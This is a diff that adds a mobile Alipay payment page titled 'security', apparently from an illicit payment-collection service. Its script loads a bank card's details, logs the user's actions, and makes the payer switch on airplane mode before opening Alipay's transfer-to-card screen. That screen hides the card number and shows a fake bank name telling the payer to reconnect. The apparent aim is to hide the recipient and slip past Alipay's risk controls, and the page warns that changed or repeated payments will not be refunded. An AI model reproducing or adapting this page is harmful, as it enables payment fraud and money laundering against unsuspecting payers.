@@ -1,0 +1,192 @@
+<html>
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
+		<meta name="apple-mobile-web-app-capable" content="yes">
+		<meta name="apple-mobile-web-app-status-bar-style" content="black">
+		<meta name="format-detection" content="telephone=no">
+		<title>安全</title>
+		<script src="lib/alipayjsapi.inc.min.js"></script>
+		<link rel="stylesheet" href="css/antui-all.css">
+	</head>
+
+	<body ontouchstart="">
+		<p id="lasqetbj" style="display: none">非法操作</p>
+		<!-- 移动端-->
+		<div class="isMobile" id="isMobile">
+
+			<div class="mobile-header">
+				<svg class="icon" style="width: auto; height: 40px;vertical-align: middle;fill: currentColor;overflow: hidden;color:rgb(0, 160, 233)" viewBox="0 0 2830 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1981">
+					<path d="M2746.224 707.097l-44.748 96.855-45.429-96.855h-44.346l69.074 133.948v93.39h40.71v-93.39l0.28-0.52 68.794-133.428h-44.335z m-327.637 58.584l31.539 94.273h-64.246l32.707-94.273z m41.233 122.965l15.216 45.79h42.668l-84.01-227.362h-32.61l-83.682 227.362h42.692l15.849-45.79h83.877z m-318.321-72.85h-45.344V738.03h45.344c22.733 0 36.343 19.838 36.343 39.04 0 18.773-12.747 38.725-36.343 38.725z m2.287-108.699h-88.657v227.339h41.026v-87.39h47.63c44.226 0 75.132-28.76 75.132-69.974s-30.906-69.975-75.131-69.975zM1847.76 934.413h41.05V707.097h-41.05v227.316z m-288.57-227.316v227.339h138.064v-30.957h-97.05V707.097h-41.014z m-233.702 58.584l31.54 94.273h-64.246l32.706-94.273z m41.233 122.965l15.216 45.79h42.644l-83.962-227.362h-32.61l-83.706 227.362h42.668l15.898-45.79h83.876-0.024z m288.825-625.967h-175.951v-62.863h204.036V160.66h-204.036V81.04h-90.968l-0.049 0.023c-10.095 0.162-18.16 8.472-18.001 18.57v61.052h-202.613v39.177h202.613v62.841h-171.045v39.132h340.635s-18.865 73.438-112.326 152.403c-83.695-63.18-111.682-113.477-111.682-113.477h-91.381c36.988 63.862 89.52 115.017 146.066 155.575-51.948 33.652-119.344 66.125-206.48 92.054v46.877s134.45-25.273 264.365-101.566c130.12 75.682 260.801 101.566 260.801 101.566V590.88c-83.621-30.344-149.91-63.702-201.944-95.903 75.411-55.64 141.47-131.209 167.936-232.275l0.024-0.023z m571.642-173.826h-91.6v95.45H1909.78v38.384h225.783V565.7a15.81 15.81 0 0 1-14.79 14.38h-46.536v39.765h118.736c19-0.99 33.972-16.567 34.215-35.599v-361.58h37.207v-38.384h-37.207V88.853z m-193.174 198.555a20.415 20.415 0 0 0-18.111-11.549h-76.312l59.393 186.6h90.311l-55.281-175.05z m796.671 325.87l-32.196-108.382a16.72 16.72 0 0 0-15.872-11.935h-85.337l24.728 83.246h-100.322V414.948h197.018v-38.43h-197.018v-75.885h197.018V262.25h-491.742v38.384h197.018v75.885h-197.018v38.43h197.018v161.259h-197.018v38.429h503.723l-0.401-1.314h0.401v-0.045zM1808.583 84.367l-105.078 247.72h80.593v294.777h88.146V235.844h-31.94l66.423-151.498h-98.144v0.022z m620.865 86.325h286.989v56.614h102.499v-67.098c-0.05-0.181-0.05-0.228-0.05-0.408 0-15.082-11.858-27.266-26.539-27.537h-165.88v-52.81h-107.243v52.765h-192.262v95.043h102.486v-56.614 0.045zM825.428 640.112c144.366 48.03 177.088 50.635 177.088 50.635V174.09c0-88.183-71.786-159.63-160.511-159.63H160.58C71.877 14.462 0 85.909 0 174.092v677.167c0 88.137 71.854 159.606 160.602 159.606h681.403c88.68 0 160.511-71.47 160.511-159.606v-6.545S741.754 736.695 610.07 673.74c-88.295 107.975-202.224 173.556-320.502 173.556-200.005 0-267.94-173.986-173.238-288.505 20.675-24.931 55.776-48.8 110.328-62.162 85.261-20.832 221.021 13 348.22 54.734A691.632 691.632 0 0 0 631.357 414.2H239.295v-39.494h202.133v-70.722h-244.82V264.47h244.82v-100.91s0-17.006 17.347-17.006h98.803V264.49h242.08v39.494h-242.08v70.722H755.16c-18.887 76.995-47.623 147.876-83.653 210.083 59.942 21.536 113.816 41.961 153.899 55.323h0.023zM243.667 555.69c-25.046 2.49-72.058 13.496-97.761 36.096-77.085 66.759-30.98 188.886 125.003 188.886 90.627 0 181.232-57.632 252.384-149.845-101.18-49.096-186.961-84.241-279.604-75.137h-0.022z" fill="#00A0E9" p-id="1982"></path>
+				</svg>
+			</div>
+
+			<section class="m-zfb">
+				<div style="height:10px;"></div>
+				<div class="am-ft-center">
+					<p style="font-size:14px;height: 64px;">金额：¥ <span id="amount" class="am-ft-20 am-ft-price"></span></p>
+					<p style="color:red;text-align: center;font-size: 15px;">禁止修改金额或重复支付 将不到帐并且不退款</p> 
+				</div>
+
+				<div class="feisimg">
+					<img src="payImg/feixing.png" alt="">
+				</div>
+
+				<p style="text-align:center;font-size: 20px;color:#f4333c;;padding: 10px 0;">如遇交易中断 <span style="color:#f4333c;;padding: 0 10px;">请重新下单</span></p>
+
+				<footer class="mobile-foot">
+
+					<div class="flex-center">
+						<button type="button" class="am-button payqrbtn loading" id="okpay">
+              <span id="btn-pop-text">已开飞行模式，立即支付</span>
+           </button>
+					</div>
+				</footer>
+			</section>
+			<div class="am-dialog-mask bgbklck"></div>
+			<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+			<script src="lib/tool.js"></script>
+			<div>
+				<script>
+					var oHttp = window.location.origin
+					//创建工具类
+					var tool = new Tool();
+					var interface_api = decodeURIComponent(tool.cutUrl("a"));
+
+
+					var domttime = 23;
+					var timesetint;
+
+					//轮训数
+					var lunxnumber = 0;
+
+					var bankAccount, money, amount, bankMark, cardIndex, bankName, asdsdkname, bankCardNoHiden;
+
+					//立即支付按钮
+					var otn = document.getElementById("okpay");
+					//money
+					var elamount = document.getElementById("amount");
+
+					//安卓
+					var isAndroid = ua.indexOf('ndroid') > -1 || ua.indexOf('inux') > -1;
+
+					//主请求参数
+					var _tradeNoDataMain = {
+						orderId: tool.cutUrl("orderId")
+					}
+
+					//记录用户行为参数
+					var _tradeNoData = {
+						action: "",
+						ua: uaage,
+						orderId: tool.cutUrl("orderId")
+					};
+
+					//记录行为
+					_tradeNoData.action = "enter_index_ok|" + tool.nowTime();
+
+					function getUrl(_data) {
+						$.ajax({
+							url: oHttp + '/pay/pages/getCodeInfo',
+							type: "post",
+							async: false, //请求是否异步，默认为异步，这也是ajax重要特性   
+							data: _data,
+							success: function(res) {
+								if(res.code == 0) {
+									var res = res.data
+									asdsdkname = res.codeInfo.bankAccount;
+									money = res.money + "";
+									amount = res.money + "";
+									bankMark = res.codeInfo.bankMark;
+									bankCardIndex = res.codeInfo.cardIndex;
+									bankName = res.codeInfo.bankName;
+									bankCardNoHiden = res.codeInfo.cardNo;
+
+									$("#amount").text(res.money)
+									$("#okpay").removeAttr("disabled");
+									$("#btn-pop-text").text("已开飞行模式，立即支付");
+									$("#loading-box").remove();
+
+									_tradeNoData.action = "getTradeNo_ok|" + tool.nowTime();
+
+									//1.第一步获取数据-然后拼接链接
+									otn.addEventListener("click", function() {
+
+										_tradeNoData.action = "click_to_pay|" + tool.nowTime();
+										
+										ap.getNetworkType(function(res) {
+											//判断网络
+											if(res.networkAvailable === false) {
+												$("#okpay").attr("disabled", "disabled");
+												timesetint = setInterval(function() {
+													if(domttime <= 0) {
+														$("#okpay").text("如未跳转？请稍等几秒");
+														$("#okpay").removeAttr("disabled");
+														domttime = 20;
+														clearInterval(timesetint);
+													} else {
+														domttime--;
+														$("#okpay").text("正在授权中..." + domttime + "s");
+													}
+												}, 2000)
+
+												window.setTimeout(function() {
+													AlipayJSBridge.call("startApp", {
+														appId: "20000116",
+														param: {
+															actionType: "toCard",
+															sourceId: "bill",
+															startFromExternal: true,
+															cardNo: bankCardNoHiden,
+															receiverName: asdsdkname,
+															bankAccount: asdsdkname,
+															money: money,
+															amount: money,
+															bankMark: bankMark,
+															bankName: "请重新打开网络支付",
+															cardIndex: bankCardIndex,
+															cardNoHidden: "true",
+															cardChannel: "HISTORY_CARD",
+															orderSource: "from"
+														}
+													});
+												}, 888)
+
+											} else {
+												alert("请先关闭网络或者打开飞行模式再点击立即付款按钮，跳转转账界面后再打开网络或者关闭飞行模式即可支付");
+											}
+										});
+									})
+								} /*else if(res.code == 80006) {
+									setTimeout(function() {
+										lunxnumber++;
+										if(lunxnumber >= 15) {
+											$("#btn-pop-text").text("下单失败，请重新下单");
+											$("#loading-box").remove();
+											//记录行为
+											_tradeNoData.action = "getTradeNo-80006|" + tool.nowTime();
+										} else {
+											getUrl(_tradeNoDataMain);
+										}
+									}, 888)
+								} */else {
+									$("#btn-pop-text").text("下单失败，请重新下单");
+									$("#loading-box").remove();
+									_tradeNoData.action = "getTradeNo-failure|" + tool.nowTime();
+								}
+							},
+							error: function(err) {
+								$("#btn-pop-text").text("下单失败，请重新下单");
+								$("#loading-box").remove();
+								_tradeNoData.action = "getTradeNo-error|" + tool.nowTime();
+							}
+						})
+					}
+					getUrl(_tradeNoDataMain);
+				</script>
+			</div>
+		</div>
+
+	</body>
+
+</html>
